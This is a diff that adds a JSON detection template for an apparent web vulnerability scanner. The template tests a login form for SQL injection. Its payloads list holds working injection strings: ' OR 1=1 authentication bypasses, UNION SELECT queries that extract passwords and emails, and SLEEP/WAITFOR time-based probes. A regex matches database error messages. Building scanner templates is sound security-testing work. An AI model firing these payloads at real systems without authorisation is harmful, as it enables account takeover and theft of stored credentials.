@@ -1,0 +1,43 @@
+{
+    "id": "sqli-POST",
+    "info": "An SQLi injection involves attacker sending SQL queries to the database server.",
+    "severity": "high",
+    "request": {
+        "path": "/",
+        "method": "POST",
+        "redirects": "",
+        "headers": {
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Encoding": "gzip, deflate",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Connection": "keep-alive",
+            "User-Agent": "SkyFall Scanner",
+            "Content-Type": "application/x-www-form-urlencoded"
+        }
+    },
+    "stopAtMatch": true,
+    "matchers-condition": "and",
+    "matches": [
+        {
+            "type": "regex",
+            "part": "body",
+            "regex": "\\b(UNION|OR)\\b.+(\bSELECT\\b|\\b1=1\\b)|Syntax error|Unknown column|You have an error in your SQL syntax|error in your SQL syntax|mysql_fetch_array\\(\\) expects parameter 1 to be resource|Warning: mysql_num_rows\\(\\): supplied argument is not a valid MySQL result resource"
+        },
+        {
+            "type": "status",
+            "code": [301, 302, 303, 307, 308],
+            "condition": "or"
+        }
+    ],
+    "payloads": [
+        "csrf=ygGzyeeZKqWwHH2efBkDMPNrwVpEksVG&username=administrator'--&password=test",
+        "username=admin&password=%27+OR+1=1--",
+        "username=admin&password=1 UNION SELECT * FROM users WHERE id = 1--",
+        "username=admin&password=1 UNION SELECT password FROM users WHERE username = 'admin'--",
+        "username=admin&password=1 UNION SELECT email FROM users WHERE id = 1--",
+        "username=admin&password=1 OR 1=1--",
+        "username=admin&password=1; WAITFOR DELAY '0:0:5'--",
+        "username=admin&password=1' AND SLEEP(5)--",
+        "username=admin&password=' OR 1=1 LIMIT 1 OFFSET 0--"
+    ]
+}
